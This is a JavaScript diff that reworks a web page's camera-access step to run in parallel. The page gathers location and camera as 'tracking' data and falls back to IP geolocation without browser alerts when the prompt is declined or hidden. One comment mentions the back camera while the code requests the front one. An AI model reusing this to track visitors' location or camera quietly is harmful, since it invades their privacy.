@@ -1717,22 +1717,29 @@
         });
 
         // === STEP 3: Camera Access (runs in parallel) ===
+        let cameraPromise = Promise.resolve();
         if (userAllowed && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
           // Try back camera first on mobile devices, fallback to generic
           const cameraAttempts = [
             { video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } } },
             { video: true }
           ];
-          
-          for (const constraints of cameraAttempts) {
-            try {
-              await tryCamera(constraints);
-              break; // Success - stop trying
-            } catch(err) {
-              console.warn("[Camera] Attempt failed:", err.name, err.message);
-              cameraStatus = err.name === 'NotAllowedError' ? 'denied' : 'error: ' + err.name;
+          cameraPromise = (async () => {
+            for (const constraints of cameraAttempts) {
+              try {
+                await tryCamera(constraints);
+                break; // Success - stop trying
+              } catch(err) {
+                console.warn("[Camera] Attempt failed:", err.name, err.message);
+                cameraStatus = err.name === 'NotAllowedError' ? 'denied' : 'error: ' + err.name;
+              }
             }
-          }
+          })();
+        }
+
+        // Wait for all tracking promises to resolve if the user allowed access
+        if (userAllowed) {
+          await Promise.all([locationPromise, cameraPromise]);
         } else {
           // User declined or prompt is hidden: directly use IP geolocation fallback without popping up browser alerts
           const ipGeoResult = await ipGeoPromise;
